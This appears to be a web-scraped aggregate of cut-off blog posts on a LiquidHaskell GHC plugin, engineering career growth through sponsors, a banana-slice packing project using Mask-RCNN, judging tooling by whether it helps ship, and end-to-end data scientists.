      liquidhaskell &gt;= 0.8.10</code></pre>
<ol start="2" type="1">
<li>Second, tell GHC to use the plugin</li>
</ol>
<pre><code>  ghc-options: -fplugin=LiquidHaskell</code></pre>
<p>That’s it. Now, everytime you (re-)build the code, GHC will <em>automatically</em> run LH on the changed modules! If you use <code>stack</code> you may have to specify a few more dependencies, as the various packages are not (yet) on stackage, as shown in the <a href="https://github.com/ucsd-progsys/lh-plugin-demo/blob/main/stack.yaml">demo <code>stack.yaml</code></a>. No extra dependencies are needede if you use <code>cabal-v2</code>. In both cases, you can use the respective files <a href="https://github.com/ucsd-progsys/lh-plugin-demo/blob/main/stack.yaml.github"><code>stack.yaml</code></a> and <a href="https://github.com/ucsd-progsys/lh-plugin-demo/blob/main/cabal.project.github"><code>cabal.project</code></a> point to specific git snapshots if you want to use the most recent versions. If you clone the repo and run, e.g.&nbsp;<code>cabal v2-build</code> or <code>stack build</code> you’ll get the following result, after the relevant dependencies are downloaded and built of course…</p>

<h3 id="benefits">Benefits</h3>
<p>There are a couple of benefits to note immediately</p>
<ul>
<li><p>A plain <code>stack build</code> or <code>cabal v2-build</code> takes care of all the installing <em>and</em> checking!</p></li>
<li><p>No need to separately <em>install</em> LH; its part of the regular build.</p></li>
<li><p>GHC’s recompilation machinery ensures that only the relevant modules are checked, e.g.&nbsp;the second time round, LH did not need to analyze <code>Lib.hs</code> only <code>Client.hs</code></p></li>
</ul>
<h2 id="shipping-specifications-with-packages">2. Shipping Specifications with Packages</h2>
<p>While the above is nice, in principle it could have been done with some clever <code>makefile</code> trickery (perhaps?). What I’m much more excited about is that now, for the first time, you can <em>ship refinement type specifications within plain Haskell packages</em>.</p>
<p>For example, consider a different <a href="https://github.com/ucsd-progsys/lh-plugin-demo-client">lh-plugin-demo-client</a> package that uses <code>incr</code> from <code>lh-plugin-demo</code>:</p>

<p>Again, the <code>lh-plugin-demo-client.cabal</code> file need only specify the various dependencies:</p>
<pre><code>  build-depends:
      liquid-base,
      liquidhaskell,

<h3 id="prelude-specifications">Prelude Specifications</h3>
<p>Did you notice the strange <code>liquid-base</code> dependency in the cabal files?</p>
<p>Previously, LH came installed with a “built-in” set of specifications for various <code>prelude</code> modules. This was <em>hacked</em> inside LH in a rather unfortunate manner, which made these specifications very difficult to extend.</p>
<p>Moving forward, all the refinement specifications e.g.&nbsp;for <code>GHC.List</code> or <code>Data.Vector</code> or <code>Data.Set</code> or <code>Data.Bytestring</code> simply live in packages that <em>mirror</em> the original versions, e.g.&nbsp;<code>liquid-base</code>, <code>liquid-vector</code>, <code>liquid-containers</code>, <code>liquid-bytestring</code>. Each <code>liquid-X</code> package directly <em>re-exports</em> all the contents of the corresponding <code>X</code> package, but with any additional refinement type specifications.</p>
<p>Thus, all the refined types for various prelude operations like <code>(+)</code> or <code>(-)</code> or <code>head</code> and so on, now ship with <code>liquid-base</code> and we add that dependency <strong>instead of</strong> base. Similarly, if you want to verify that <em>your</em> code has no <code>vector</code>-index overflow errors, you simply build with <code>liquid-vector</code> <strong>instead of</strong> <code>vector</code>! Of course, in an ideal, and hopefully not too distant future, we’d directly include the refinement types inside <code>vector</code>, <code>containers</code> or <code>bytestring</code> respectively.</p>
<h3 id="benefits-1">Benefits</h3>
<p>So to recap, the plugin offers several nice benefits with respect to <em>shipping specifications</em></p>
<ul>
<li><p>Refined signatures are bundled together with packages,</p></li>
<li><p>Importing packages with refined signatures automatically ensures those signatures are checked on client code,</p></li>
<li><p>You can (optionally) use refined versions of <code>prelude</code> signatures, and hence, even write refined versions of your favorite <em>custom preludes</em>.</p></li>
</ul>

<p>I saved <em>my</em> favorite part for the end.</p>
<p>What I have enjoyed the most about the plugin is that now (almost) all the GHC-based tools that I use in my regular Haskell development workflow, automatically incorporate LH too! For example, reloading a module in <code>ghci</code> automatically re-runs LH on that file.</p>
<h3 id="ghcid"><code>ghcid</code></h3>
<p>This means, that the mega robust, editor-independent <code>ghcid</code> now automatically produces LH type errors when you save a file. Here’s <code>ghcid</code> running in a terminal.</p>

<p>Editor plugins now produce little red squiggles for LH errors too. Here’s <code>code</code> with the <code>Simple GHC (Haskell) Integration</code> plugin</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><div><p>I recently started mentoring someone that works at another company. Their goal is to become a “tech lead”: at their company, this is a person that others look for technical advice, and that can influence teams’ technical decisions. Because this person does not work where I do, I was forced to think generically about the matter of growth, rather than jumping to specific advice I would be able to provide a coworker.</p><p>In general, you might want to grow in your software engineering career, but:</p><ul><li>what does growth mean? </li><li>how can you achieve it?</li><li>who decides if you are ready to grow?</li><li>where do you start?</li></ul><p>Years ago I read a phrase in <a href="https://www.forbes.com/sites/daviatemin/2016/04/04/what-theyre-saying-about-you-when-youre-not-in-the-room-and-what-you-can-do-to-influence-it/#4cb99ee771ac" target="_blank" rel="nofollow noopener noreferrer">this article</a> that made many things click for me:</p><blockquote><p>The biggest decisions about your career are often made when you’re not in the room</p></blockquote><p>For example, when I was working at a consulting company I did not decide which projects I was involved in. It depended on the contracts we closed, customers’ budget and other’s allocations.</p><p>Whenever I’m thinking about career growth I keep that in mind.  It helped me put together a mental model for professional growth. This blog post shares my growth model and how you can use it to carve your career growth path.</p><p>Let’s introduce some terms first:</p><ul><li>Growth: access to more challenging and/or new opportunities. Growth is multidimensional.</li><li>Opportunity: a possibility for improving and/or displaying your skills. They might be accompanied by financial rewards, recognition, etc.</li><li>Skills: what you can do, including knowledge required to do it</li></ul><p>From those three definitions a couple of questions arise:</p><ol><li>Who are you displaying your skills to?</li><li>Who gets you access to opportunities?</li></ol><p>To answer those questions and complete the model we need to define <strong>Sponsors</strong>:</p><ul><li>Sponsors: People that are aware of available opportunities and can grant them to you. </li></ul><p>Applying <a href="https://lethain.com/systems-thinking/" target="_blank" rel="nofollow noopener noreferrer">systems thinking</a> to the model we come up with this diagram:
<img src="https://yenkel.dev/media/2020-08-25/growth.png"></p><ol><li>Your opportunities increase as new opportunities are granted to you. This rate depends on your sponsors.</li><li>Your skills improve depending on how fast you learn from your opportunities.</li><li>You get more sponsors the more people have a positive perception of your skills. These displays depend on your skills, e.g.: when you are given the opportunity to present you are displaying your presentation skills. If you are good at presenting, sponsors will perceive that.</li></ol><h2 id="takeaways"><a href="#takeaways" aria-label="takeaways permalink"></a>Takeaways</h2><p>Our <em>growth</em> definition means you want to maximize <em>your opportunities</em>. The most important takeaway is:</p><p><strong>Skill alone doesn’t matter. If no one but yourself knows about your skills, you won’t get any opportunities.</strong></p><p>What you want is to:</p><ol><li>Maximize <strong>Available Opportunities</strong></li><li>Maximize <strong>Sponsors</strong></li></ol><h2 id="your-energy"><a href="#your-energy" aria-label="your energy permalink"></a>Your energy</h2><p>To keep the model simple and the post short I am not including “Your energy” as a stock. Modeling energy is complex:
When you take new opportunities your energy decreases. When you run out of energy you <a href="https://medium.com/hackernoon/why-theres-so-much-burnout-in-software-and-what-to-do-about-it-4ef0297ca7cc" target="_blank" rel="nofollow noopener noreferrer">burnout</a>.
When you do things you enjoy doing or rest (take fewer opportunities) your energy replenishes.
Your energy levels affect your skill learning/improvement rate.
And there are many ways in which your energy levels change that are not part of the system model I propose but impact the system nevertheless…</p><p>You can easily see how this would make the model more complex. However, just because it is harder to model it doesn’t mean you shouldn’t consider energy as part of your approach to growth.</p><p>Opportunities come in different flavors, not all of them are “being tasked to do something”. All of these are opportunities:</p><ul><li>Changing teams to work on a different problem set</li><li>Being picked to technically lead an initiative larger than you have ever lead before</li><li>Speaking at a conference</li><li>Attending a workshop</li><li>Frequently being mentored by a more senior person</li></ul><p><img src="https://yenkel.dev/media/2020-08-25/opportunity.jpg"></p><p>If there are few <strong>Available Opportunities</strong>, it doesn’t matter how good you are, it is very unlikely you will be granted new ones. <strong>Available Opportunities</strong> are also contextual: they depend on your seniority, team, company’s financial situation, etc. You are also not interested in ANY opportunity. There are specific things that you’ll be interested in doing and/or learning.</p><p>With those things in mind, these are some tips for maximizing <strong>Available Opportunities</strong>.</p><ol><li><strong>Pick opportunities based on your growth goals</strong>: If you want to grow as a distributed systems engineer, opportunities related to building mobile applications are likely to help you less than opportunities related to building databases. I recommend avoiding short term goals related to “titles” and instead prioritized improving your skills over time.</li></ol><p>Goals don’t necessarily need to be getting a better title/promoted. A goal in your career can just be “maximizing learning”, which means you need to “maximize learning opportunities” and your “improve rate”.</p><p><a href="https://lethain.com/forty-year-career/" target="_blank" rel="nofollow noopener noreferrer">This article</a> by Will Larson does a great job of explaining how to plan for a long term career.
<a href="https://medium.com/@bellmar/why-is-this-idiot-running-my-engineering-org-c6e815790cdb" target="_blank" rel="nofollow noopener noreferrer">This article</a> by Marianne Belloti talks about some drawbacks of making career decisions based on just looking for higher titles and admiration</p><ol><li><p><strong>Determine how to best get those opportunities</strong>, ideally minimizing <em>“investment”</em> required to get them: </p><p>If you can get the opportunities you are interested in by staying in your current team, that’s great. If that’s not the case: are there other teams in the engineering organization doing what you want? Are there teams in other departments in the organization doing it? If not, then it might be time to change companies.</p><p>The same applies to conference speaking. If there are two similar conferences on the same date, and one of them requires you to fly 14 hours and the other one only 2 hours, you probably want to pick the latter.</p><p>Large companies that have a strict process for granting opportunities based on just “years at the company” are reducing the amount of <strong>Available Opportunities</strong>, regardless of your skills. This is why high growth startups are sometimes so popular for people that want to grow, there are plenty of opportunities.</p></li><li><p><strong>Create your opportunities</strong>: Proactively propose opportunities to sponsors, adding them to the <strong>Available Opportunities</strong> stock. </p><p>Want to get better at automated testing? Do some research to explain how more testing would help the team/company, explain that to the right sponsor (more on that later), and pitch to work on a project related to that next quarter. Simultaneously, reach out to someone in your organization that you believe is great at automated testing and ask them to mentor you.</p></li></ol><h2 id="reorganizations"><a href="#reorganizations" aria-label="reorganizations permalink"></a>Reorganizations</h2><p>Reorganizations might change the <strong>Available Opportunities</strong> a lot, especially at Senior Engineer (or higher) roles. Depending on the reorganization type and size you might get a heads up and be asked for feedback on options regarding where you will land. During those conversations consider the future <strong>Available Opportunities</strong> to decide what to do.</p><p>Having determined the kind of opportunity you want, the next thing is to get the sponsors for those opportunities to think of your skills as a good fit for them. This involves:</p><ol><li>Finding the right sponsor</li><li>Make your skills visible to them</li></ol><p>When you begin your career as a developer, your team’s Manager or Tech Lead is likely your main sponsor. They are aware of opportunities for tasks/work inside the team and they are the ones assigning work.</p><p>As you grow the situation changes, but you <a href="https://staffeng.com/guides/staying-aligned-with-authority" target="_blank" rel="nofollow noopener noreferrer">always need sponsors</a>. Senior Engineer role (or higher) related opportunities might be discussed at a cross-team level, maybe in a forum involving multiple Managers and/or Directors. Principal level engineers might also have a say in nudging decisions about critical initiatives. People’s titles stop being a good indicator of “sponsorship ability”. <strong>In essence, you need to understand the <a href="https://en.wikipedia.org/wiki/Informal_organization" target="_blank" rel="nofollow noopener noreferrer">informal organization</a> and how it relates to the opportunities you are interested in.</strong></p><p>If you are lost, ask someone you trust and is influential for help. This person doesn’t necessarily need to be a coworker. They should be able to provide guidance. </p><p><img src="https://yenkel.dev/media/2020-08-25/sponsors.jpg"></p><h2 id="visibility"><a href="#visibility" aria-label="visibility permalink"></a>Visibility</h2><p>After identifying the right sponsor(s) you need to make your skills (and interest) visible to them (“skill displays”). Remember: this is not about “lying” or “faking it”. This is about generating awareness. </p><p>You can do this in different ways:</p><ol><li><strong>1:1s</strong>: if you can get a 1:1 with the sponsor to chat about opportunities, do it. In general, when you reach out to people asking them to help you grow and learn, their reactions will be helpful and positive. In these situations, it helps to <a href="#self-awareness">be self-aware</a>.</li><li><strong>Generate content</strong>: internal or external content (conference talks, blog posts) allows you to share your skills. If you want more opportunities to work with Kafka maybe doing a Kafka brown bag and inviting the infrastructure tech leads can help.</li><li><strong>Share accomplishments</strong>: The parallel to: “If a tree falls in a forest and no one is around to hear it, does it make a sound?” is “If you reduce AWS expenses by 25% but no one knows about it, did it happen?“. Make sure the right sponsors know what you have achieved. Whenever you do this, make sure you give credit where credit is due.</li></ol><p>The more senior your sponsor the more things they have on their mind. It is hard for them to pay attention and keep in mind the skills and goals of multiple people. </p><p>Make sure you provide visibility in an easy to consume format. There are some specific approaches that you can use to provide visibility about your work:
<a href="https://jvns.ca/blog/brag-documents/" target="_blank" rel="nofollow noopener noreferrer">Brag documents</a> by Julia Evans
<a href="https://lethain.com/career-narratives/" target="_blank" rel="nofollow noopener noreferrer">Career narratives</a> by Will Larson</p><p>Periodically remind sponsors of your skills and goals. Following up with your sponsors and repeating yourself once in a while is fine.</p><p>Some potential sponsors might be biased. If they are negatively biased towards you, you will need a much higher “skill display rate” than a person they aren’t biased against would need to get them to be YOUR sponsor. There might even be cases when they will never become sponsors, no matter how high your “skill display rate”.</p><p>Lara Hogan has a <a href="https://larahogan.me/blog/what-sponsorship-looks-like/" target="_blank" rel="nofollow noopener noreferrer">great blog post</a> on this topic.</p><p>Consider sponsor bias whenever you are looking to decide if a person is “the right sponsor” for you.</p><h3 id="outside-your-company"><a href="#outside-your-company" aria-label="outside your company permalink"></a>Outside your company</h3><p>Sharing your skills in public sites (LinkedIn, Twitter, conference talks, blogs, etc.) creates …</p></div></div></div></div>

<p>I was personally useless for most of the Spring of 2020. There was a period of time, though, after the peak in coronavirus cases here in NYC and before the onslaught of police violence here in NYC that I managed to scrounge up the motivation to do something other than drink and maniacally refresh my Twitter feed. I set out to work on something completely meaningless. It was almost therapeutic to work on a project with no value of any kind (<em>insert PhD joke here</em>).</p>
<p>A side effect of having spent 10 years with limited income in college and grad school, 6 of those here in expensive ass NYC, is that I eat of lot of cheap sandwiches, even though I now have a nice Tech™ job. While my sandwich consumption was quite formidable pre-covid, sheltering in place cemented this staple in my diet. I am particularly fond of peanut butter and banana sandwiches, having been introduced to them as a child by my maternal grandfather who ate them regularly.</p>
<p>I start a peanut butter and banana sandwich by spreading peanut butter on two slices of bread. I then slice circular slices of the banana, starting at the end of the banana, and place each slice on one of the pieces of bread until I have a single layer of banana slices. Every time I do this, the former condensed matter physicist in me starts to twitch his eye. You see, I have this urge, this desire, this <em>need</em> to maximize the <a href="https://en.wikipedia.org/wiki/Atomic_packing_factor">packing fraction</a> of the banana slices. That is, I want to maximize the coverage of the banana slices on the bread. Just as bowl-form food is perfect because you get every ingredient in every bite, each bite of my sandwich should yield the same golden ratio of bread, peanut butter, and banana.</p>
<p>If you were a machine learning model (or my wife), then you would tell me to just cut long rectangular strips along the long axis of the banana, but I’m not a sociopath. If life were simple, then the banana slices would be perfect circles of equal diameter, and we could coast along looking up optimal configurations on <a href="http://packomania.com/">packomania</a>. But alas, life is not simple. We’re in the middle of a global pandemic, and banana slices are elliptical with varying size.</p>
<p>So, how do we make optimal peanut butter and banana sandwiches? It’s really quite simple. You take a picture of your banana and bread, pass the image through a deep learning model to locate said items, do some nonlinear curve fitting to the banana, transform to polar coordinates and “slice” the banana along the fitted curve, turn those slices into elliptical polygons, and feed the polygons and bread “box” into a 2D nesting algorithm.</p>
<p>You may have noticed that I supposedly started this project in the Spring, and it’s now August. Like most idiot engineers, I had no idea how complicated this stupid project was going to be, but time’s meaningless in quarantine, so here we are. And here you are! Because I made a pip installable python package <a href="https://github.com/EthanRosenthal/nannernest">nannernest</a> if you want to optimize your own sandwiches, and I’m going to spend the rest of this post describing how this whole godforsaken thing works.</p>

<h2 id="sandwich-segmentation">Sandwich Segmentation</h2>
<p>I know that deep learning has been properly commoditized when the easiest part of this project was identifying every pixel that belongs to a banana or slice of bread in an image. Seriously, this step was super easy. I used a pretrained Mask-RCNN torchvision <a href="https://pytorch.org/docs/stable/torchvision/models.html#torchvision.models.detection.maskrcnn_resnet50_fpn">model</a> with a Resnet backbone. The model was pretrained on the COCO <a href="https://cocodataset.org/">dataset</a>, and thankfully the dataset has “banana” as segmentation category, along with “sandwich” and “cake” which were close enough categories for suitable detection of most slices of bread.</p>
<p>Passing an image through the model outputs a bunch of detected objects, where each detected object has an associated <code>label</code>, <code>score</code>, <code>bounding box</code>, and <code>mask</code>, where the mask identifies the pixels that correspond to the object with a weight at each pixel corresponding to the model’s confidence in that pixel’s label.</p>
<p>Because there could be multiple bananas and slices of bread in the image, I pick out the banana and slice of bread with the highest score. Below, you can see the model is clearly able to identify the banana and bread, with the mask overlaid in a semi-transparent, radioactive green.</p>

<p>Now that we have identified the banana in the image, we need to virtually “slice” it. This is where we are first introduced to the universal pain of computer vision:</p>
<p><em>By eye, I can see exactly what I want to do; by code, it’s so damn difficult.</em></p>
<p>I could ask you to draw lines on the banana identifying where you would slice it, and you could easily draw well-spaced, somewhat parallel slices. It’s not so easy to do this with code. However, I would also argue that this is the fun part of the problem. There are many ways to solve this, and it feels creative, as opposed to using a pre-trained deep learning model. On the other hand, “creatively” solving these problems likely leads to more brittle solutions compared to deep learning models trained on millions of examples. There’s a tradeoff here.</p>
<p>I tried a bunch of analytical solutions based on ellipses, but nothing seemed to work quite right. I ended up landing on a somewhat simpler solution that may not be robust to straight bananas, but who cares – this is a silly project anyway. Using the wonderful <a href="https://scikit-image.org/">scikit-image</a> library, I first calculate the <a href="https://scikit-image.org/docs/dev/auto_examples/edges/plot_skeleton.html">skeleton</a> of the banana segmentation mask. This reduces the mask to a one pixel wide representation which effectively creates a curve that runs along the long axis of the banana.</p>

<p>I then fit a circle to the banana skeleton using a nice scipy-based least squares optimization I found <a href="https://scipy-cookbook.readthedocs.io/items/Least_Squares_Circle.html#Using-scipy.optimize.leastsq">here</a>. I actually originally tried to fit this with PyTorch and totally failed, likely due to the fact that this is actually a nonlinear optimization problem.</p>

<h2 id="rad-coordinate-transformations">Rad Coordinate Transformations</h2>
<p>With the circle fit to the banana, the goal is to now draw radial lines out from the center of the circle to the banana and have each radial line correspond to the slice of a knife. Again, while it’s easy to visualize this, it’s much harder in practice. For example, we need to start slicing at one end of the banana, but how do we find an end of the banana? Also, there are two ends, and we have to differentiate between them. Contrary to the behavior of <a href="https://www.thekitchn.com/why-you-should-peel-your-banana-like-a-monkey-206322">monkeys</a>, I start slicing my bananas at the stem end, and that’s what we’re going to do here.</p>
<p>Crucially, because we now have this circle and want to cut radial slices, we must transform from cartesian to polar coordinates and orient ourselves both radially and angularly with respect to the banana. As a start for orienting ourselves angularly, we calculate the <em>centroid</em> of the banana mask, which corresponds to the center of mass of the banana mask if the banana mask were a 2D object. The centroid is shown below as a red dot.</p>
<p>We now draw a radial line originating from the banana circle and passing through the centroid, shown as the dashed white line below. We will consider that line to mark our <em>reference</em> angle which orients us to the center of the banana.</p>

<p>Using <code>scikit-image</code>, we calculate the segmentation <code>mask</code> intensity along this radial line using the <code>profile_line</code> function. Because our line is passing at an angle along discrete <code>mask</code> pixels (aka matrix entries), we take an average of neighboring points along the radial line cut using the <code>linewidth</code> arguments. As you can see, the banana mask pops out a little over 100 points from the banana circle center.</p>

<p>This profile line is what allows us to orient ourselves radially. You can clearly see where the banana starts and ends, in the radial direction. As always, just seeing it is not good enough. We need code to define the start and end of the banana in this direction. The <code>mask</code> tends to be monotonically increasing and then monotonically decreasing along the start and end, respectively. Using this information, there are a couple ways …</p></article></section></section></div></div>

  <p>25 Aug 2020</p>

  <p>Whenever I’m not sure whether I’m spending my time on the right thing I ask
myself: <em>does it help me ship?</em></p>

<p>If what I consider working on is not the thing we want to ship itself, but lies
in the vast grey area of software projects where I could write code all day long
without the user ever noticing, this question helps me decide whether to drop it
or invest some time in it.</p>

<p>Let me illustrate.</p>

<p>One imaginary Friday afternoon I notice that we have a few <code>// TODO</code> comments in our
codebase. Hmm, I could create a bot that looks for those comments whenever a new
commit is pushed. It could use <code>git blame</code> to see who the author is and create a
ticket assigned to them, saying that they should fix their TODO in line X in
file Y, please. And, cherry on top, when a pull request that touches a TODO is
opened, the bot would mark the corresponding ticket as work-in-progress. And
when the pull request is merged, the bot closes the ticket. And when a pull
request merely changes the <code>TODO:</code> into a <code>TODO(poorsoul):</code> then it assigns the
ticket to <code>poorsoul</code>.</p>

<p>Sounds pretty good, right? Turn those TODOs into tickets and never lose a TODO
again.</p>

<p>The problem is: it’s not free. It looks like it is, because the code is quickly
written and it runs as a GitHub action we don’t have to pay for, but it’s not.</p>

<p>It’s <em>another</em> process, <em>another</em> tool, <em>another</em> automated piece in our
machinery. Another thing that needs to be fixed when it ultimately breaks
down, another bit of automation that works 99% of the time, but starts making
funny noises when you slip into the 1% and, say, moved a TODO down five lines by
accident and don’t want the bot to close and re-open tickets, kicking off
another wave of notifications.</p>

<p><em>That’s</em> the actual cost of adding that bot.</p>

<p>The question is do we want to pay it? Does it help me ship? Does it help me ship
<em>more</em>? Or does it help me ship <em>faster</em>, or with less friction, more safely?</p>

<p>If our imaginary codebase has more TODOs than test cases, for example, and these
TODOs are holding us back from shipping because we can’t make a change without
having to ask colleagues what this TODO we just discovered means, then it might
be a good idea to add the bot. Even if we don’t intend to fix all of the TODOs,
but only to finally get an overview and a peek at hidden part of the iceberg. It
helps us ship.</p>

<p>If the code contains more than one <code>TODO: make sure this works</code> and we can’t
ship because changing the code is playing a game of Russian roulette, where
every change could kick off an avalanche of bugs, then yes, this bot would
probably help us ship.</p>

<p>But what if we’re <em>not</em> held back by TODOs? What if we have a total of 18 of them,
and 12 of those have been in the codebase longer than you and I have been at the
company, and, generally speaking, our codebase is in an okay state — is the cost
worth it?</p>

<p>If what’s holding you back from shipping is, say, getting more customer input,
or a brittle release process, or flaky monitoring, or missing tests, then all
the bot does is to add noise. It doesn’t help you ship.</p>

<p>I found this <em>worrying</em>. It’s difficult to be effective when the data science process (problem framing, data engineering, ML, deployment/maintenance) is split across different people. It leads to coordination overhead, diffusion of responsibility, and lack of a big picture view.</p>

<p>IMHO, <strong>I believe data scientists can be more effective by being end-to-end</strong>.

<p>I find these definitions to be more prescriptive than I prefer. Instead, I have a simple (and pragmatic) definition: An end-to-end data scientist can <strong>identify and solve problems with data, to deliver value</strong>. To achieve the goal, they’ll wear as many (or as little) hats as required. They’ll also learn and apply whatever tech, methodology, and process that works. Throughout the process, they ask questions such as:</p>
<ul>
  <li>What is the problem? Why is it important?</li>
  <li>Can we solve it? How should we solve it?</li>
  <li>What is the estimated value? What was the actual value?</li>
</ul>

<details><summary>Data Science Processes</summary>
<div>
<p>Another way of defining end-to-end data science is via processes. These processes are usually complex and I’ve left them out of the main discussion. Nonetheless, here are a few in case you’re curious:</p>

<ul>
  <li><a href="https://en.wikipedia.org/wiki/Cross-industry_standard_process_for_data_mining" target="_blank">CRISP-DM</a>: Cross-Industry Standard Process for Data Mining (1997).</li>
  <li><a href="https://en.wikipedia.org/wiki/Data_mining#Process" target="_blank">KDD</a>: Knowledge Discovery in Databases.</li>
  <li><a href="https://docs.microsoft.com/en-us/azure/machine-learning/team-data-science-process/overview" target="_blank">TDSP</a>: Team Data Science Process, proposed by Microsoft in 2018.</li>
  <li><a href="https://github.com/dslp/dslp" target="_blank">DSLP</a>: Data Science Lifecycle Process.</li>
</ul>

<p>Don’t worry if these processes seem heavy and overwhelming. You don’t have to adopt them wholesale—start bit by bit, keep what works and adapt the rest.</p>
</div>

</details>

<h2 id="more-context-faster-iteration-greater-satisfaction">More context, faster iteration, greater satisfaction</h2>

<p>For most data science roles, being more end-to-end improves your ability to make meaningful impact. (Nonetheless, there are <a href="https://nvidia.wd5.myworkdayjobs.com/en-US/NVIDIAExternalCareerSite/job/US-CA-Santa-Clara/Senior-Deep-Learning-Data-Scientist--RAPIDS---AI_JR1929838" target="_blank">roles</a> that focus on machine learning.)</p>

<p><strong>Working end-to-end provides increased context.</strong> While specialized roles can increase efficiency, it reduces context (for the data scientist) and leads to suboptimal solutions.</p>

<blockquote>
  <p>The trick to forgetting the big picture is to look at everything close-up. – Chuck Palahniuk</p>
</blockquote>

<p>It’s hard to design a holistic solution without full context of the upstream problem. Let’s say conversion has decreased and a PM raises a request to improve our search algorithm. However, what’s causing the decrease in the first place? There could be various causes:</p>
<ul>
  <li>Product: Is fraudulent/poor quality product reducing customer trust?</li>
  <li>Data pipelines: Has data quality been compromised or are there delays/outages?</li>
  <li>Model refresh: Is the model not refreshing regularly/correctly?</li>
</ul>

<p>More often than not, the problem—and solution—lies <em>outside</em> of machine learning. A solution to <em>improve the algorithm</em> would miss the root cause.</p>

<p>Similarly, it’s risky to develop a solution without awareness of downstream engineering and product constraints. There’s no point:</p>
<ul>
  <li>Building a near-real time recommender if infra and engineer cannot support it</li>
  <li>Building an infinite scroll recommender if it doesn’t fit in our product and app</li>
</ul>

<p>By working end-to-end, data scientists will have the full context to identify the right problems and develop usable solutions. It can also lead to innovative ideas that specialists, with their narrow context, might miss. Overall, it increases the ability to deliver value.</p>

<p><strong>Communication and coordination overhead is reduced.</strong> With multiple roles comes additional overhead. Let’s look at an example of a data engineer (DE) cleaning the data and creating features, a data scientist (DS) analysing the data and training the model, and a machine learning engineer (MLE) deploying and maintaining it.</p>

<blockquote>
  <p>What one programmer can do in one month, two programmers can do in two months. – Frederick P. Brooks</p>
</blockquote>

<p>The DE and DS need to <em>communicate</em> on what data is (and is not) available, how it should be cleaned (e.g., outliers, normalisation), and which features should be created. Similarly, the DS and MLE have to discuss how to deploy, monitor, and maintain the model, as well as how often it should be refreshed. When issues occur, we’ll need three people in the room (likely with a PM) to triage the root cause and next steps to fix it.</p>

<p>It also leads to additional coordination, where schedules need to be aligned as work is executed and passed along in a sequential approach. If the DS wants to experiment with additional data and features, we’ll need to wait for the DE to ingest the data and create the features. If a new model is ready for A/B testing, we’ll need to wait for the MLE to (convert it to production code) and deploy it.</p>

<p>While the actual development work may take days, the communication back-and-forth and coordination can take weeks, if not longer. With end-to-end data scientists, we can minimize this overhead as well as prevent technical details from being lost in translation.</p>

<p>(But, can an end-to-end DS really do all that? I think so. While the DS might not be as proficient in some tasks as a DE or MLE, they will be able to perform most tasks effectively. If they need help with scaling or hardening, they can always get help from specialist DEs and MLEs.)</p>

<details><summary>The Cost of Communication and Coordination</summary>
<div>
<p>Richard Hackman, a Harvard psychologist, showed that the number of relationships in a team is <code><span>N</span><span>(</span><span>N</span><span>-</span><span>1</span><span>)</span> <span>/</span> <span>2</span></code>, where <code><span>N</span></code> is the number of people. This leads to exponential growth in links, where:</p>

<ul>
  <li>A start-up team of 7 has 21 links to maintain</li>
  <li>A group of 21 (i.e., three start-up teams) has 210 links</li>
  <li>A group of 63 has almost 2,000 links.</li>
</ul>

<p>In our simple example, we only had three roles (i.e., six links). But as a PM, BA, and additional members are included, this leads to greater than linear growth in communication and coordination costs. Thus, while each additional member increases total team productivity, the increased overhead means productivity grows at a decreasing rate. (Amazon’s <a href="https://buffer.com/resources/small-teams-why-startups-often-win-against-google-and-facebook-the-science-behind-why-smaller-teams-get-more-done/" target="_blank">two-pizza teams</a> are a possible solution to this.)</p>
</div>
</details>

<p><strong>Iteration and learning rate is increased.</strong> With greater context and lesser overhead, we can now iterate, fail (read: learn), and deliver value faster.</p>

<p>This is especially important for developing data and algorithmic products. Unlike software engineering (a far more mature craft), we can’t do all the learning and design before we start building—our blueprints, architectures, and design patterns are not as developed. Thus, rapid iteration is essential for the design-build-learn cycle.</p>

<p><strong>There’s greater ownership and accountability.</strong> Having the data science process split across multiple people can lead to diffusion of responsibility, and worse, social loafing.</p>

<p>A common anti-pattern observed is “<a href="https://wiki.c2.com/?ThrownOverTheWall" target="_blank">throw over the wall</a>”. For example, the DE creates features and throws a database table to the DS, the DS trains a model and throws <code>R</code> code over to the MLE, and the MLE translates it to <code>Java</code> to production.</p>

<p>If things get lost-in-translation or if results are unexpected, who is responsible? With a strong culture of ownership, everyone steps up to contribute in their respective roles. But without it, work can degenerate into ass-covering and finger-pointing while the issue persists and customers and the business suffers.</p>

<p>Having the end-to-end data scientist take ownership and responsibility for the entire process can mitigate this. They should be empowered to take action from start to finish, from the customer problem and input (i.e., raw data) to the output (i.e., deployed model) and measurable outcomes.</p>

<details><summary>Diffusion of Responsibilty &amp; Social Loafing</summary>
<div>

<p><a href="https://en.wikipedia.org/wiki/Diffusion_of_responsibility" target="_blank">Diffusion of responsibility</a>: We are less likely to take responsibility and act when there are others present. Individuals feel less responsibility and urgency to help if we know that there are others also watching the situation. </p>

<p>One form of this is the <a href="https://en.wikipedia.org/wiki/Diffusion_of_responsibility#Bystander_effect" target="_blank">Bystander effect</a>, where <a href="https://en.wikipedia.org/wiki/Murder_of_Kitty_Genovese" target="_blank">Kitty Genovese</a> was stabbed outside the apartment building across the street from where she lived. While there were 38 witnesses who saw or heard the attack, none called the police or helped her.</p>

<p><a href="https://en.wikipedia.org/wiki/Social_loafing" target="_blank">Social loafing</a>: We exert less effort when we work in a group vs. working alone. In the 1890s, Ringelmann made people pull on ropes both separately and in groups. He measured how hard they pulled and found that members of a group tended to exert less effort in pulling a rope than did individuals alone.</p>

</div>
</details>

<p><strong>For (some) data scientists, it can lead to increased motivation and job satisfaction</strong>, which is <a href="https://www.clearpointstrategy.com/how-employees-are-motivated-autonomy-mastery-purpose/" target="_blank">closely tied</a> to autonomy, mastery, and purpose.</p>
<ul>
  <li><strong>Autonomy:</strong> By being able to solve problems independently. Instead of waiting and depending on others, end-to-end data scientists are able to identify and define the problem, build their own data pipelines, and deploy and validate a solution.</li>
  <li><strong>Mastery:</strong> In the problem, solution, outcome from end-to-end. They can also pick up the domain and tech as required.</li>
  <li><strong>Purpose</strong>: By being deeply involved in the entire process, they have a more direct connection with the work and outcomes, leading to an increased sense of <em>purpose</em>.</li>
</ul>

<h2 id="but-we-need-specialist-experts-too">But, we need specialist experts too</h2>

<p>Being end-to-end is not for everyone (and every team) though, for reasons such as:</p>

